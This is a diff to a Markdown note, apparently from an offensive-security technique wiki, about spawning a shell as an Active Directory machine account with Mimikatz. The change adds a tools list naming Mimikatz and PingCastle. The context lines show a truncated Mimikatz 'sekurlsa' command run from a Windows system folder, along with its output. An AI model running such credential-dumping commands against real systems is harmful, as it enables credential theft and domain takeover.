@@ -21,6 +21,9 @@ output: "C:\\Windows\\System32\\spool\\drivers\\color>.\\MimiKatz.exe \"sekurlsa
   \  OK\n   \\_ *Password replace @ 0000022C339F0128 (32) -> null"
 created_at: '2020-06-24T23:26:31.434306+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Mimikatz]]'
+- '[[PingCastle]]'
 ---
 
 # Mimikatz Spawn a Shell as an AD Machine Account
